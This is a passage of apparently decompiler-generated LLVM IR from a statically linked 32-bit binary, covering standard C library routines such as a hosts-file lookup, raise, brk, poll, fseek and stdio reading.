  %v0_80555fc.pre = load i32, i32* @esi, align 4
  %v5_8055600 = icmp slt i32 %v0_80555fc.pre, %stack_var_-196.0.lcssa
  br i1 %v5_8055600, label %dec_label_pc_8055602, label %dec_label_pc_805560d

dec_label_pc_8055602:                             ; preds = %dec_label_pc_8055602.lr.ph, %dec_label_pc_80555da
  %v0_8055602 = phi i32 [ %v0_8055602.pre, %dec_label_pc_8055602.lr.ph ], [ %v1_80555f1, %dec_label_pc_80555da ]
  %v1_80555dd91 = phi i32 [ 1, %dec_label_pc_8055602.lr.ph ], [ %v0_80555fc.pre, %dec_label_pc_80555da ]
  store i32 %v0_8055602, i32* @ebx, align 4
  %v7_805560b = icmp sgt i32 %v0_8055602, 2
  br i1 %v7_805560b, label %dec_label_pc_805560d, label %dec_label_pc_80555da

dec_label_pc_805560d:                             ; preds = %dec_label_pc_80555fc.preheader, %dec_label_pc_80555da, %dec_label_pc_8055602, %dec_label_pc_80555b8
  %v0_805560d = load i32, i32* @ebx, align 4
  store i32 ptrtoint ([7 x i8]* @global_var_8060f72.796 to i32), i32* %stack_var_-216, align 4
  %v0_8055614 = load i32, i32* @edi, align 4
  %v4_8055615 = inttoptr i32 %v0_8055614 to i8*
  %v5_8055615 = call i32 @__GI_strcoll(i8* %v4_8055615, i32 ptrtoint ([7 x i8]* @global_var_8060f72.796 to i32), i32 %v0_805560d, i32 %v0_805560d)
  store i32 %v5_8055615, i32* @eax, align 4
  %v1_805561d = icmp eq i32 %v5_8055615, 0
  br i1 %v1_805561d, label %dec_label_pc_805565f.preheader, label %dec_label_pc_8055621

dec_label_pc_8055621:                             ; preds = %dec_label_pc_805560d
  %v0_8055621 = load i32, i32* @ecx, align 4
  store i32 ptrtoint ([7 x i8]* @global_var_8060f79.797 to i32), i32* %stack_var_-216, align 4
  %v0_8055628 = load i32, i32* @edi, align 4
  %v4_8055629 = inttoptr i32 %v0_8055628 to i8*
  %v5_8055629 = call i32 @__GI_strcoll(i8* %v4_8055629, i32 ptrtoint ([7 x i8]* @global_var_8060f79.797 to i32), i32 %v0_8055621, i32 %v0_8055621)
  %v1_8055631 = icmp eq i32 %v5_8055629, 0
  br i1 %v1_8055631, label %dec_label_pc_805565f.preheader, label %dec_label_pc_80556a2.backedge

dec_label_pc_805565f.preheader:                   ; preds = %dec_label_pc_805560d, %dec_label_pc_8055621
  %v0_805565f92 = load i32, i32* @global_var_8067c38.790, align 8
  %tmp4594 = icmp slt i32 %v0_805565f92, 1
  %tmp4695 = icmp eq i1 %tmp4594, false
  br i1 %tmp4695, label %dec_label_pc_8055637, label %dec_label_pc_8055668

dec_label_pc_8055637:                             ; preds = %dec_label_pc_805565f.preheader, %dec_label_pc_8055637.dec_label_pc_8055637_crit_edge
  %v0_805565f96 = phi i32 [ %v0_805565f, %dec_label_pc_8055637.dec_label_pc_8055637_crit_edge ], [ %v0_805565f92, %dec_label_pc_805565f.preheader ]
  %v1_8055637 = add i32 %v0_805565f96, -1
  store i32 %v1_8055637, i32* @global_var_8067c38.790, align 8
  %v1_8055640 = mul i32 %v1_8055637, 4
  %v2_8055640 = add i32 %v1_8055640, 134642712
  %v3_8055640 = inttoptr i32 %v2_8055640 to i32*
  %v4_8055640 = load i32, i32* %v3_8055640, align 4
  %v1_8055647 = call i32 @free(i32 %v4_8055640)
  %v0_805564c = load i32, i32* @global_var_8067c38.790, align 8
  %v1_8055654 = mul i32 %v0_805564c, 4
  %v2_8055654 = add i32 %v1_8055654, ptrtoint (i32* @global_var_8067c18.798 to i32)
  %v3_8055654 = inttoptr i32 %v2_8055654 to i32*
  store i32 0, i32* %v3_8055654, align 4
  %v0_805565f = load i32, i32* @global_var_8067c38.790, align 8
  %tmp45 = icmp slt i32 %v0_805565f, 1
  %tmp46 = icmp eq i1 %tmp45, false
  br i1 %tmp46, label %dec_label_pc_8055637.dec_label_pc_8055637_crit_edge, label %dec_label_pc_8055668

dec_label_pc_8055637.dec_label_pc_8055637_crit_edge: ; preds = %dec_label_pc_8055637
  br label %dec_label_pc_8055637

dec_label_pc_8055668:                             ; preds = %dec_label_pc_8055637, %dec_label_pc_805565f.preheader
  %v0_805565f.lcssa = phi i32 [ %v0_805565f92, %dec_label_pc_805565f.preheader ], [ %v0_805565f, %dec_label_pc_8055637 ]
  store i32 1, i32* @esi, align 4
  %v5_8055695100 = icmp sgt i32 %stack_var_-196.0.lcssa, 1
  br i1 %v5_8055695100, label %dec_label_pc_8055697, label %dec_label_pc_80556a2.backedge

dec_label_pc_805566f:                             ; preds = %dec_label_pc_8055697
  %v2_8055672 = mul i32 %v1_8055672102, 4
  %v4_8055672 = add i32 %v2_8055672, %v3_80555dd
  %v5_8055672 = inttoptr i32 %v4_8055672 to i32*
  %v6_8055672 = load i32, i32* %v5_8055672, align 4
  %v1_8055679 = inttoptr i32 %v6_8055672 to i8*
  %v2_8055679 = call i32 @__GI_strdup(i8* %v1_8055679)
  %v0_805567e = load i32, i32* @esi, align 4
  %v1_805567e = add i32 %v0_805567e, 1
  store i32 %v1_805567e, i32* @esi, align 4
  %v1_805567f = load i32, i32* @ebx, align 4
  %v2_805567f = mul i32 %v1_805567f, 4
  %v3_805567f = add i32 %v2_805567f, 134642712
  %v4_805567f = inttoptr i32 %v3_805567f to i32*
  store i32 %v2_8055679, i32* %v4_805567f, align 4
  %v0_8055686 = load i32, i32* @ebx, align 4
  %v1_8055686 = add i32 %v0_8055686, 1
  store i32 %v1_8055686, i32* @global_var_8067c38.790, align 8
  %v0_8055691.pre = load i32, i32* @esi, align 4
  %v5_8055695 = icmp slt i32 %v0_8055691.pre, %stack_var_-196.0.lcssa
  br i1 %v5_8055695, label %dec_label_pc_8055697, label %dec_label_pc_80556a2.backedge

dec_label_pc_8055697:                             ; preds = %dec_label_pc_8055668, %dec_label_pc_805566f
  %v1_8055672102 = phi i32 [ %v0_8055691.pre, %dec_label_pc_805566f ], [ 1, %dec_label_pc_8055668 ]
  %v0_8055697101 = phi i32 [ %v1_8055686, %dec_label_pc_805566f ], [ %v0_805565f.lcssa, %dec_label_pc_8055668 ]
  store i32 %v0_8055697101, i32* @ebx, align 4
  %v7_80556a0 = icmp sgt i32 %v0_8055697101, 3
  br i1 %v7_80556a0, label %dec_label_pc_80556a2.backedge, label %dec_label_pc_805566f

dec_label_pc_805552f.preheader:                   ; preds = %dec_label_pc_805552f.preheader.lr.ph, %dec_label_pc_80556a2.backedge
  %v0_805552f.pre = load i32, i32* @ebx, align 4
  %v4_805552f.pre = load i32, i32* @ecx, align 4
  %v1_805552f51 = inttoptr i32 %v0_805552f.pre to i8*
  %v2_805552f52 = load i8, i8* %v1_805552f51, align 1
  %v3_805552f53 = zext i8 %v2_805552f52 to i32
  %v5_805552f54 = and i32 %v4_805552f.pre, -256
  %v6_805552f55 = or i32 %v3_805552f53, %v5_805552f54
  store i32 %v6_805552f55, i32* @ecx, align 4
  %v4_805553156 = icmp eq i8 %v2_805552f52, 0
  br i1 %v4_805553156, label %dec_label_pc_80556a2.backedge, label %dec_label_pc_8055539.lr.ph

dec_label_pc_8055539.lr.ph:                       ; preds = %dec_label_pc_805552f.preheader
  %v0_805553c.pre = load i32, i32* @global_var_80612cc, align 4
  br label %dec_label_pc_8055539

dec_label_pc_80556be:                             ; preds = %dec_label_pc_80556a2.backedge, %dec_label_pc_80556a2.preheader
  %v0_80556c1 = load i32, i32* @ebp, align 4
  %v1_80556c2 = inttoptr i32 %v0_80556c1 to i16*
  %v2_80556c2 = call i32 @__GI_fclose(i16* %v1_80556c2)
  br label %dec_label_pc_80556d7

dec_label_pc_80556cc:                             ; preds = %dec_label_pc_805550b
  %v0_80556cc = call i32 @__GI___h_errno_location()
  %v1_80556d1 = inttoptr i32 %v0_80556cc to i32*
  store i32 3, i32* %v1_80556d1, align 4
  br label %dec_label_pc_80556d7

dec_label_pc_80556d7:                             ; preds = %entry, %dec_label_pc_80556be, %dec_label_pc_80556cc
  store i32 1, i32* %stack_var_-216, align 4
  store i32 %v2_80554c4, i32* @eax, align 4
  %v2_80556e3 = call i32 @__pthread_return_void(i32 %v2_80554c4, i32 1)
  store i32 %v0_80554b0, i32* @ebp, align 4
  ret i32 %v2_80556e3

; uselistorder directives
  uselistorder i32 %v0_805553c.pre, { 1, 0 }
  uselistorder i32 %v6_805552f55, { 1, 0 }
  uselistorder i8 %v2_805552f52, { 1, 2, 0 }
  uselistorder i8* %v1_805552f51, { 1, 0 }
  uselistorder i32 %v0_805552f.pre, { 1, 0 }
  uselistorder i32 %v0_805565f, { 0, 2, 1 }
  uselistorder i32 %v1_8055637, { 1, 0 }
  uselistorder i32 %v0_8055602, { 1, 0 }
  uselistorder i32 %v0_80555fc.pre, { 1, 0 }
  uselistorder i32 %stack_var_-196.0.lcssa, { 3, 1, 2, 0 }
  uselistorder i32 %stack_var_-196.013, { 0, 1, 3, 2, 4 }
  uselistorder i32 %v2_8055595, { 1, 0 }
  uselistorder i8 %v2_805558f83, { 1, 0 }
  uselistorder i32 %v2_8055576, { 1, 0 }
  uselistorder i8 %v2_805557068, { 1, 0 }
  uselistorder i32 %v1_805556f, { 0, 2, 1, 3 }
  uselistorder i32 %v2_8055539, { 1, 0 }
  uselistorder i32 %v1_805552e, { 1, 0, 2 }
  uselistorder i32 %v2_80556a9, { 2, 3, 0, 1 }
  uselistorder i32 %v2_8055517, { 1, 0 }
  uselistorder i32 %v2_80554f9, { 1, 0, 2 }
  uselistorder i32* %stack_var_-216, { 1, 3, 4, 5, 2, 0, 6, 7, 9, 8 }
  uselistorder i32 %tmp, { 1, 0 }
  uselistorder i32 ()* @__GI___h_errno_location, { 5, 4, 3, 2, 0, 1 }
  uselistorder i32 (i32)* @free, { 19, 16, 15, 14, 13, 12, 11, 10, 26, 25, 24, 23, 1, 9, 8, 7, 6, 5, 18, 17, 20, 22, 21, 3, 4, 2, 0 }
  uselistorder i32* @global_var_8067c38.790, { 1, 2, 3, 4, 0, 5, 6, 7 }
  uselistorder i32 152, { 1, 0, 2, 3 }
  uselistorder i8 10, { 0, 1, 2, 14, 3, 4, 5, 6, 7, 8, 15, 9, 16, 10, 11, 12, 13, 17 }
  uselistorder i32 164, { 1, 0 }
  uselistorder i32* @global_var_8067c34.727, { 1, 0, 2, 3 }
  uselistorder i32 ptrtoint (i32* @global_var_8061548.726 to i32), { 1, 3, 4, 5, 6, 7, 8, 0, 2, 9 }
  uselistorder label %dec_label_pc_80556d7, { 2, 1, 0 }
  uselistorder label %dec_label_pc_805552f.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_8055697, { 1, 0 }
  uselistorder label %dec_label_pc_8055637, { 1, 0 }
  uselistorder label %dec_label_pc_805565f.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_805560d, { 2, 1, 0, 3 }
  uselistorder label %dec_label_pc_8055602, { 1, 0 }
  uselistorder label %dec_label_pc_80555b8, { 1, 0, 2 }
  uselistorder label %dec_label_pc_80555b1, { 1, 0 }
  uselistorder label %dec_label_pc_80555a8, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8055595, { 1, 0 }
  uselistorder label %dec_label_pc_8055576, { 1, 0 }
  uselistorder label %dec_label_pc_80556a2.backedge, { 0, 3, 4, 2, 7, 6, 5, 1 }
  uselistorder label %dec_label_pc_80556a2.preheader, { 1, 0 }
}

define i32 @__get_hosts_byname_r(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
entry:
  %v9_8055717 = inttoptr i32 %arg3 to i32*
  %v10_8055717 = call i32 @__read_etc_hosts_r(i32 0, i32 %arg1, i32 %arg2, i32 0, i32* %v9_8055717, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7)
  ret i32 %v10_8055717
}

define i32 @__raise(i32 %arg1) local_unnamed_addr {
entry:
  %v0_8055723 = call i32 @__libc_getpid()
  %v2_805572f = call i32 @kill(i32 %v0_8055723, i32 %arg1)
  ret i32 %v2_805572f

; uselistorder directives
  uselistorder i32 (i32, i32)* @kill, { 0, 4, 3, 2, 1 }
  uselistorder i32 ()* @__libc_getpid, { 0, 3, 2, 1 }
}

define i32 @_dl_aux_init() local_unnamed_addr {
entry:
  %v0_8055738 = load i32, i32* @eax, align 4
  %v1_8055738 = add i32 %v0_8055738, 28
  %v2_8055738 = inttoptr i32 %v1_8055738 to i32*
  %v3_8055738 = load i32, i32* %v2_8055738, align 4
  store i32 %v3_8055738, i32* @global_var_8067c3c.799, align 4
  %v1_8055741 = add i32 %v0_8055738, 44
  %v2_8055741 = inttoptr i32 %v1_8055741 to i32*
  %v3_8055741 = load i32, i32* %v2_8055741, align 4
  store i32 %v3_8055741, i32* @global_var_8067c40.800, align 64
  ret i32 %v3_8055741
}

define i32 @__GI_brk(i32 %arg1) local_unnamed_addr {
entry:
  %ecx.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_805574c = load i32, i32* @ebx, align 4
  store i32 %v0_805574c, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* %ecx.global-to-local, align 4
  %v1_805575f = call i32 @int80_syscall(i32 45)
  store i32 0, i32* %ecx.global-to-local, align 4
  store i32 %v1_805575f, i32* @global_var_8067804.777, align 4
  %v7_805576a = icmp ult i32 %v1_805575f, %arg1
  %v1_805576c = icmp eq i1 %v7_805576a, false
  br i1 %v1_805576c, label %dec_label_pc_805577c, label %dec_label_pc_805576e

dec_label_pc_805576e:                             ; preds = %entry
  %v0_805576e = load i32, i32* %stack_var_-4, align 4
  %v1_805576e = call i32 @__errno_location(i32 %v0_805576e)
  store i32 -1, i32* %ecx.global-to-local, align 4
  %v1_8055776 = inttoptr i32 %v1_805576e to i32*
  store i32 12, i32* %v1_8055776, align 4
  %v0_805577c.pre = load i32, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_805577c

dec_label_pc_805577c:                             ; preds = %entry, %dec_label_pc_805576e
  %v0_805577c = phi i32 [ 0, %entry ], [ %v0_805577c.pre, %dec_label_pc_805576e ]
  %v2_8055780 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8055780, i32* @ebx, align 4
  ret i32 %v0_805577c

; uselistorder directives
  uselistorder i32 %v1_805575f, { 1, 0 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder i32* @global_var_8067804.777, { 1, 0, 2 }
  uselistorder label %dec_label_pc_805577c, { 1, 0 }
}

define i32 @__libc_poll() local_unnamed_addr {
entry:
  %edi.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp3 = call i32 @__decompiler_undefined_function_0()
  %tmp4 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-4 = alloca i32, align 4
  %v0_8055784 = load i32, i32* @edi, align 4
  store i32 %v0_8055784, i32* %stack_var_-4, align 4
  store i32 %tmp4, i32* %edi.global-to-local, align 4
  %v0_8055794 = load i32, i32* @ebx, align 4
  %v1_8055795 = inttoptr i32 %tmp4 to %pollfd*
  %v5_805579c = call i32 @poll(%pollfd* %v1_8055795, i32 %tmp3, i32 %tmp)
  store i32 %v0_8055794, i32* @ebx, align 4
  store i32 %v5_805579c, i32* %edi.global-to-local, align 4
  %tmp10 = icmp ult i32 %v5_805579c, -4095
  br i1 %tmp10, label %dec_label_pc_80557b4, label %dec_label_pc_80557a8

dec_label_pc_80557a8:                             ; preds = %entry
  %v1_80557a8 = call i32 @__errno_location(i32 %v0_8055794)
  %v0_80557ad = load i32, i32* %edi.global-to-local, align 4
  %v1_80557ad = sub i32 0, %v0_80557ad
  %v2_80557af = inttoptr i32 %v1_80557a8 to i32*
  store i32 %v1_80557ad, i32* %v2_80557af, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_80557b4

dec_label_pc_80557b4:                             ; preds = %entry, %dec_label_pc_80557a8
  %v0_80557b4 = phi i32 [ %v5_805579c, %entry ], [ -1, %dec_label_pc_80557a8 ]
  %v2_80557b8 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_80557b8, i32* @edi, align 4
  ret i32 %v0_80557b4

; uselistorder directives
  uselistorder i32 %v5_805579c, { 1, 0, 2 }
  uselistorder i32 %v0_8055794, { 1, 0 }
  uselistorder label %dec_label_pc_80557b4, { 1, 0 }
}

define i32 @__GI_fseek(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v1_80557c7 = ashr i32 %arg2, 31
  %v4_80557ce = inttoptr i32 %arg1 to i16*
  %v5_80557ce = call i32 @__GI_fseeko64(i16* %v4_80557ce, i32 %arg2, i32 %v1_80557c7, i32 %arg3)
  ret i32 %v5_80557ce
}

define i32 @__GI_fseeko64(i16* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %v0_80557d8 = load i32, i32* @ebp, align 4
  %v0_80557d9 = load i32, i32* @edi, align 4
  %v0_80557da = load i32, i32* @esi, align 4
  %v0_80557db = load i32, i32* @ebx, align 4
  store i32 %arg4, i32* @edi, align 4
  store i32 %arg2, i32* %eax.global-to-local, align 4
  store i32 %arg3, i32* @edx, align 4
  %v4_80557eb = ptrtoint i16* %arg1 to i32
  store i32 %v4_80557eb, i32* @esi, align 4
  store i32 %arg2, i32* %stack_var_-28, align 4
  %tmp27 = icmp ult i32 %arg4, 3
  br i1 %tmp27, label %dec_label_pc_805580f, label %dec_label_pc_80557fc

dec_label_pc_80557fc:                             ; preds = %entry
  %v1_80557fc = call i32 @__errno_location(i32 %arg2)
  store i32 %v1_80557fc, i32* %eax.global-to-local, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  %v1_8055804 = inttoptr i32 %v1_80557fc to i32*
  store i32 22, i32* %v1_8055804, align 4
  br label %dec_label_pc_80558b1

dec_label_pc_805580f:                             ; preds = %entry
  %v1_805580f = add i32 %v4_80557eb, 52
  %v2_805580f = inttoptr i32 %v1_805580f to i32*
  %v3_805580f = load i32, i32* %v2_805580f, align 4
  %v1_8055812 = icmp eq i32 %v3_805580f, 0
  %v1_8055814 = icmp eq i1 %v1_8055812, false
  br i1 %v1_8055814, label %dec_label_pc_8055835, label %dec_label_pc_8055816

dec_label_pc_8055816:                             ; preds = %dec_label_pc_805580f
  %v1_8055816 = add i32 %v4_80557eb, 56
  store i32 %v1_8055816, i32* @ebx, align 4
  %v2_8055820 = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v2_8055820, i32* @eax, align 4
  %v3_8055825 = call i32 @__pthread_return_void(i32 %v2_8055820, i32 134560279)
  store i32 %v3_8055825, i32* %eax.global-to-local, align 4
  %v0_805582a = load i32, i32* @ebx, align 4
  %v2_805582d = call i32 @__pthread_return_0(i32 %v0_805582a)
  store i32 %v2_805582d, i32* %eax.global-to-local, align 4
  %v0_8055835.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_8055835

dec_label_pc_8055835:                             ; preds = %dec_label_pc_805580f, %dec_label_pc_8055816
  %v0_805583d = phi i32 [ %v4_80557eb, %dec_label_pc_805580f ], [ %v0_8055835.pre, %dec_label_pc_8055816 ]
  %v1_8055835 = inttoptr i32 %v0_805583d to i8*
  %v2_8055835 = load i8, i8* %v1_8055835, align 1
  %v3_8055835 = and i8 %v2_8055835, 64
  %v4_8055835 = icmp eq i8 %v3_8055835, 0
  br i1 %v4_8055835, label %dec_label_pc_805584a, label %dec_label_pc_805583a

dec_label_pc_805583a:                             ; preds = %dec_label_pc_8055835
  %v2_805583e = call i32 @__stdio_wcommit(i32 %v0_805583d)
  store i32 %v2_805583e, i32* %eax.global-to-local, align 4
  %v1_8055846 = icmp eq i32 %v2_805583e, 0
  %v1_8055848 = icmp eq i1 %v1_8055846, false
  br i1 %v1_8055848, label %dec_label_pc_8055899, label %dec_label_pc_805584a

dec_label_pc_805584a:                             ; preds = %dec_label_pc_805583a, %dec_label_pc_8055835
  %v0_805584a = load i32, i32* @edi, align 4
  %v9_805584a = icmp eq i32 %v0_805584a, 1
  %v1_805584d = icmp eq i1 %v9_805584a, false
  br i1 %v1_805584d, label %dec_label_pc_805584a.dec_label_pc_8055863_crit_edge, label %dec_label_pc_805584f

dec_label_pc_805584a.dec_label_pc_8055863_crit_edge: ; preds = %dec_label_pc_805584a
  %.pre5 = ptrtoint i32* %stack_var_-28 to i32
  br label %dec_label_pc_8055863

dec_label_pc_805584f:                             ; preds = %dec_label_pc_805584a
  %v0_805584f = load i32, i32* @ecx, align 4
  %v2_8055851 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_8055851, i32* %eax.global-to-local, align 4
  %v0_8055856 = load i32, i32* @esi, align 4
  %tmp25 = inttoptr i32 %v0_8055856 to i32*
  %v6_8055857 = call i32 @__stdio_adjust_position(i32* %tmp25, i32 %v2_8055851, i32 %v0_805584f, i32 %v0_805584f)
  store i32 %v6_8055857, i32* %eax.global-to-local, align 4
  %v2_805585f = icmp slt i32 %v6_8055857, 0
  br i1 %v2_805585f, label %dec_label_pc_8055899, label %dec_label_pc_805584f.dec_label_pc_8055863_crit_edge

dec_label_pc_805584f.dec_label_pc_8055863_crit_edge: ; preds = %dec_label_pc_805584f
  %v0_8055864.pre = load i32, i32* @edi, align 4
  br label %dec_label_pc_8055863

dec_label_pc_8055863:                             ; preds = %dec_label_pc_805584a.dec_label_pc_8055863_crit_edge, %dec_label_pc_805584f.dec_label_pc_8055863_crit_edge
  %v2_8055865.pre-phi = phi i32 [ %.pre5, %dec_label_pc_805584a.dec_label_pc_8055863_crit_edge ], [ %v2_8055851, %dec_label_pc_805584f.dec_label_pc_8055863_crit_edge ]
  %v0_8055864 = phi i32 [ %v0_805584a, %dec_label_pc_805584a.dec_label_pc_8055863_crit_edge ], [ %v0_8055864.pre, %dec_label_pc_805584f.dec_label_pc_8055863_crit_edge ]
  %v0_8055863 = load i32, i32* @edx, align 4
  store i32 %v2_8055865.pre-phi, i32* %eax.global-to-local, align 4
  %v0_805586a = load i32, i32* @esi, align 4
  %v5_805586b = inttoptr i32 %v2_8055865.pre-phi to i32*
  %v6_805586b = call i32 @__stdio_seek(i32 %v0_805586a, i32* %v5_805586b, i32 %v0_8055864, i32 %v0_8055863)
  store i32 %v6_805586b, i32* %eax.global-to-local, align 4
  %v2_8055873 = icmp slt i32 %v6_805586b, 0
  br i1 %v2_8055873, label %dec_label_pc_8055899, label %dec_label_pc_8055877

dec_label_pc_8055877:                             ; preds = %dec_label_pc_8055863
  %v0_8055877 = load i32, i32* @esi, align 4
  %v1_8055877 = inttoptr i32 %v0_8055877 to i16*
  %v2_8055877 = load i16, i16* %v1_8055877, align 2
  %v3_8055877 = and i16 %v2_8055877, -72
  store i16 %v3_8055877, i16* %v1_8055877, align 2
  %v0_805587b = load i32, i32* @esi, align 4
  %v1_805587b = add i32 %v0_805587b, 8
  %v2_805587b = inttoptr i32 %v1_805587b to i32*
  %v3_805587b = load i32, i32* %v2_805587b, align 4
  store i32 %v3_805587b, i32* %eax.global-to-local, align 4
  store i32 0, i32* %ebx.global-to-local, align 4
  %v2_8055880 = add i32 %v0_805587b, 16
  %v3_8055880 = inttoptr i32 %v2_8055880 to i32*
  store i32 %v3_805587b, i32* %v3_8055880, align 4
  %v0_8055883 = load i32, i32* %eax.global-to-local, align 4
  %v1_8055883 = load i32, i32* @esi, align 4
  %v2_8055883 = add i32 %v1_8055883, 20
  %v3_8055883 = inttoptr i32 %v2_8055883 to i32*
  store i32 %v0_8055883, i32* %v3_8055883, align 4
  %v0_8055886 = load i32, i32* %eax.global-to-local, align 4
  %v1_8055886 = load i32, i32* @esi, align 4
  %v2_8055886 = add i32 %v1_8055886, 24
  %v3_8055886 = inttoptr i32 %v2_8055886 to i32*
  store i32 %v0_8055886, i32* %v3_8055886, align 4
  %v0_8055889 = load i32, i32* %eax.global-to-local, align 4
  %v1_8055889 = load i32, i32* @esi, align 4
  %v2_8055889 = add i32 %v1_8055889, 28
  %v3_8055889 = inttoptr i32 %v2_8055889 to i32*
  store i32 %v0_8055889, i32* %v3_8055889, align 4
  %v0_805588c = load i32, i32* @esi, align 4
  %v1_805588c = add i32 %v0_805588c, 44
  %v2_805588c = inttoptr i32 %v1_805588c to i32*
  store i32 0, i32* %v2_805588c, align 4
  %v0_8055893 = load i32, i32* @esi, align 4
  %v1_8055893 = add i32 %v0_8055893, 2
  %v2_8055893 = inttoptr i32 %v1_8055893 to i8*
  store i8 0, i8* %v2_8055893, align 1
  br label %dec_label_pc_805589c

dec_label_pc_8055899:                             ; preds = %dec_label_pc_8055863, %dec_label_pc_805584f, %dec_label_pc_805583a
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_805589c

dec_label_pc_805589c:                             ; preds = %dec_label_pc_8055877, %dec_label_pc_8055899
  br i1 %v1_8055814, label %dec_label_pc_80558b1, label %dec_label_pc_80558a0

dec_label_pc_80558a0:                             ; preds = %dec_label_pc_805589c
  %v2_80558a4 = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v2_80558a4, i32* @eax, align 4
  %v3_80558a9 = call i32 @__pthread_return_void(i32 %v2_80558a4, i32 1)
  store i32 %v3_80558a9, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80558b1

dec_label_pc_80558b1:                             ; preds = %dec_label_pc_805589c, %dec_label_pc_80557fc, %dec_label_pc_80558a0
  %v0_80558b4 = load i32, i32* %ebx.global-to-local, align 4
  store i32 %v0_80558b4, i32* %eax.global-to-local, align 4
  store i32 %v0_80557db, i32* @ebx, align 4
  store i32 %v0_80557da, i32* @esi, align 4
  store i32 %v0_80557d9, i32* @edi, align 4
  store i32 %v0_80557d8, i32* @ebp, align 4
  ret i32 %v0_80558b4

; uselistorder directives
  uselistorder i32 %v2_8055865.pre-phi, { 1, 0 }
  uselistorder i32 %v0_805584a, { 1, 0 }
  uselistorder i32* %stack_var_-28, { 2, 0, 1 }
  uselistorder i32* %ebx.global-to-local, { 2, 0, 1, 3 }
  uselistorder i32 (i32)* @__pthread_return_0, { 28, 15, 14, 13, 12, 11, 10, 9, 3, 27, 34, 33, 7, 2, 1, 0, 6, 32, 5, 8, 21, 20, 19, 23, 22, 31, 18, 30, 29, 4, 17, 16, 26, 25, 24 }
  uselistorder i32 (i32, i32)* @__pthread_return_void, { 49, 48, 45, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 1, 0, 47, 46, 61, 60, 59, 58, 7, 6, 5, 4, 57, 56, 3, 2, 9, 8, 34, 33, 32, 31, 30, 29, 38, 37, 36, 35, 55, 54, 28, 27, 53, 52, 51, 50, 26, 25, 24, 23, 44, 43, 42, 41, 40, 39 }
  uselistorder i32 134560279, { 2, 3, 28, 29, 30, 31, 32, 33, 0, 4, 5, 6, 7, 8, 9, 10, 11, 12, 1, 21, 22, 23, 13, 14, 15, 16, 17, 18, 19, 24, 25, 26, 27, 20 }
  uselistorder i32 52, { 9, 2, 14, 1, 3, 4, 5, 15, 16, 6, 12, 7, 10, 8, 17, 13, 11, 0 }
  uselistorder i32 22, { 8, 15, 3, 4, 5, 6, 11, 14, 13, 9, 10, 12, 16, 7, 1, 2, 0 }
  uselistorder i32 %arg2, { 0, 2, 1 }
  uselistorder label %dec_label_pc_80558b1, { 2, 0, 1 }
  uselistorder label %dec_label_pc_805589c, { 1, 0 }
  uselistorder label %dec_label_pc_8055863, { 1, 0 }
  uselistorder label %dec_label_pc_8055835, { 1, 0 }
}

define i32 @__stdio_READ(i16* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_80558bc = load i32, i32* @ebx, align 4
  store i32 %v0_80558bc, i32* %stack_var_-4, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  %v4_80558c2 = ptrtoint i16* %arg1 to i32
  store i32 %v4_80558c2, i32* @ebx, align 4
  %v1_80558ca = bitcast i16* %arg1 to i8*
  %v2_80558ca = load i8, i8* %v1_80558ca, align 1
  %v3_80558ca = and i8 %v2_80558ca, 4
  %v4_80558ca = icmp eq i8 %v3_80558ca, 0
  %v1_80558cd = icmp eq i1 %v4_80558ca, false
  br i1 %v1_80558cd, label %dec_label_pc_80558fc, label %dec_label_pc_80558cf

dec_label_pc_80558cf:                             ; preds = %entry
  %v2_80558cf = icmp slt i32 %arg3, 0
  %v1_80558d1 = icmp eq i1 %v2_80558cf, false
  br i1 %v1_80558d1, label %dec_label_pc_80558d8, label %dec_label_pc_80558d3

dec_label_pc_80558d3:                             ; preds = %dec_label_pc_80558cf
  br label %dec_label_pc_80558d8

dec_label_pc_80558d8:                             ; preds = %dec_label_pc_80558cf, %dec_label_pc_80558d3
  %v0_80558d9 = phi i32 [ %arg3, %dec_label_pc_80558cf ], [ 2147483647, %dec_label_pc_80558d3 ]
  %v1_80558de = add i32 %v4_80558c2, 4
  %v2_80558de = inttoptr i32 %v1_80558de to i32*
  %v3_80558de = load i32, i32* %v2_80558de, align 4
  %v3_80558e1 = inttoptr i32 %arg2 to i32*
  %v4_80558e1 = call i32 @__libc_read(i32 %v3_80558de, i32* %v3_80558e1, i32 %v0_80558d9)
  store i32 %v4_80558e1, i32* %eax.global-to-local, align 4
  %tmp13 = icmp slt i32 %v4_80558e1, 1
  %tmp14 = icmp eq i1 %tmp13, false
  br i1 %tmp14, label %dec_label_pc_80558fc, label %dec_label_pc_80558ee

dec_label_pc_80558ee:                             ; preds = %dec_label_pc_80558d8
  %v1_80558e9 = icmp eq i32 %v4_80558e1, 0
  %v4_80558ec = icmp eq i1 %v1_80558e9, false
